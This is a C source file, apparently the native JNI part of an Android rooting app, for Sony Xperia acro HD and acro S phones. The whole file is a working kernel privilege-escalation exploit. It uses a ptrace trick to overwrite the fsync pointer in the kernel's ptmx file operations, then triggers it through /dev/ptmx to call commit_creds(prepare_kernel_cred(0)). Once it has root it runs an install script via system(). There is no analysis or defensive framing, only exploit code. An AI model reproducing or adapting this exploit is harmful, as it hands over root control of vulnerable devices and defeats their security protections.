/* getroot for Xperia acro HD or Xperia acro S */

/*
 * Copyright (C) 2013 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <jni.h>
#include <string.h>
#include "getroot.h"

#define PTMX_DEVICE "/dev/ptmx"

static unsigned long ptmx_fops;


struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

bool bChiled;

void obtain_root_privilege(void) {
	commit_creds(prepare_kernel_cred(0));
}

static bool run_obtain_root_privilege(void *user_data) {
	int fd;

	fd = open(PTMX_DEVICE, O_WRONLY);
	fsync(fd);
	close(fd);

	return true;
}

void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			fprintf(stderr, "PTRACE_TRACEME failed\n");
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		exit(EXIT_SUCCESS);
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}

bool ptrace_run_exploit(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {
	bool success;

	ptrace_write_value_at_address(address, value);
	success = exploit_callback(user_data);

	return success;
}

static bool run_exploit(void) {
	unsigned long int ptmx_fops_address;
	unsigned long int ptmx_fsync_address;

	ptmx_fops_address = ptmx_fops;
	ptmx_fsync_address = ptmx_fops_address + 0x38;
	return ptrace_run_exploit(ptmx_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);
}

JNIEXPORT int JNICALL Java_biz_hagurekamome_rootkitapp_MainActivity_native_1getroot
  (JNIEnv *env, jobject jo, jstring jstr, jlong prepare_kernel_cred_addr, jlong commit_creds_addr, jlong ptmx_fops_addr)
{
	char cachebuf[256];
	const char *execommand = "/install_tool.sh ";
	const char *param = " >/data/local/tmp/err.txt 2>&1";
	const char *str;
	int result;

	unsigned long prepare_kernel_cred_address;
	unsigned long commit_creds_address;

	strcpy(cachebuf, execommand);
	strcat(cachebuf, param);

	pid_t pid;

	prepare_kernel_cred_address = (unsigned long)prepare_kernel_cred_addr;
	commit_creds_address = (unsigned long)commit_creds_addr;
	ptmx_fops = (unsigned long)ptmx_fops_addr;

	prepare_kernel_cred = (void *)prepare_kernel_cred_address;
	commit_creds = (void *)commit_creds_address;

	run_exploit();

	if (getuid() != 0) {
		return -2;
	}

	result = system(cachebuf);
/*
	result = system("/data/data/biz.hagurekamome.jnitest/cache/install_tool.sh >/data/local/tmp/err.txt 2>&1");
*/
	if (result != 0){
		return result;
	}
	
	return 0;

}	
